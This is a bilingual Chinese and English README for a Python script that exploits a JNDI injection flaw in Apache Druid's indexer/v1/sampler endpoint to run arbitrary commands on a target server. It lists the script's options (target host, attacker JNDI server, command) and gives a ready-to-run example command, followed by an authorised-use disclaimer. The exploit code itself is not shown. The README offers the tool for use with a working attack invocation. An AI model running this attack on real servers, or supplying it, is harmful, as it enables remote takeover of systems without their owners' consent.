# Apache Druid JNDI Vuln
## Druid JNDI 注入漏洞利用脚本
本项目是一个利用 Druid JNDI 注入漏洞的 Python 脚本。该漏洞存在于 Druid 的 indexer/v1/sampler 接口中，攻击者可以通过构造恶意请求，在目标服务器上执行任意命令。

This project is a Python script that exploits the Druid JNDI injection vulnerability. The vulnerability exists in the indexer/v1/sampler interface of Druid, allowing an attacker to execute arbitrary commands on the target server by constructing a malicious request.

## 使用方法
使用该脚本需要提供以下参数：
- -t 或 --target：目标服务器的 IP 地址或主机名；
- -j 或 --jndi-ip：JNDI 服务器的 IP 地址；
- -c 或 --cmd：要执行的命令。
## 示例：

```bash
python druid.py -t 192.168.0.1 -j 192.168.0.2 -c "touch /tmp/success"
```
使用该脚本需要先安装 Python 3 和 requests 库。

## 注意事项
该脚本仅用于授权的渗透测试或教育目的，禁止用于非法用途；
在使用该脚本时，请务必遵守当地法律法规和道德准则，自行承担使用该脚本所造成的风险和后果；
该脚本可能会对目标服务器造成不可逆的损害，请谨慎使用。

Druid JNDI Injection Exploit Script
This project is a Python script that exploits the Druid JNDI injection vulnerability. The vulnerability exists in the indexer/v1/sampler interface of Druid, allowing an attacker to execute arbitrary commands on the target server by constructing a malicious request. The CVE number for this vulnerability is CVE-2021-38645.

## Usage
To use this script, you need to provide the following parameters:
- -t or --target: the IP address or hostname of the target server;
- -j or --jndi-ip: the IP address of the JNDI server;
- -c or --cmd: the command to execute.
## Example:

```bash
python druid.py -t 192.168.0.1 -j 192.168.0.2 -c "touch /tmp/success"
```
To use this script, you need to install Python 3 and the requests library first.

## Disclaimer
This script is for authorized penetration testing or educational purposes only. It is strictly prohibited to use it for illegal purposes;
When using this script, please comply with local laws and regulations, and ethical standards. You are solely responsible for the risks and consequences caused by using this script;This script may cause irreversible damage to the target server. Use it at your own risk.
